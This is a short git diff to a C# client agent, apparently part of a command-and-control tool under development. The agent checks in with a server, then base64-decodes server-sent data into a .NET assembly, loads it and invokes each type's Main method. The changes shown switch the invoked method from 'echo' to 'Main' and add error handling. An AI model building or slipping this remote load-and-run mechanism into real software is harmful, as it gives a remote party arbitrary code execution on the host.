@@ -55,8 +55,6 @@ namespace client
                 await Task.Delay(AgentCheckInterval);
             }
         }
-
-        
     }
 
     // class to chat with server with
@@ -160,14 +158,22 @@ namespace client
             //should take real commands to run with real plugins
             //that are loaded with assembly from a dll
             Assembly asm = Assembly.Load(Base64DecodeFile(command));
+            /*
+            * this should search through all classes to find the Main or other starting method
+            */
             foreach(Type oType in asm.GetTypes()){
                 //debug
                 dynamic c = Activator.CreateInstance(oType);
-                var method = oType.GetMethod("echo");
-                method.Invoke(c, null);
+                try{
+                    var method = oType.GetMethod("Main");
+                    method.Invoke(c, null);
+                } catch {
+                    Console.WriteLine("cannot find Main method");
+                    return "failed";
+                }
             }
             //File.WriteAllBytes("./file", Base64DecodeFile(command));
-            return "lala";
+            return "did it";
         }
 
         private Byte[] Base64DecodeFile(string file){
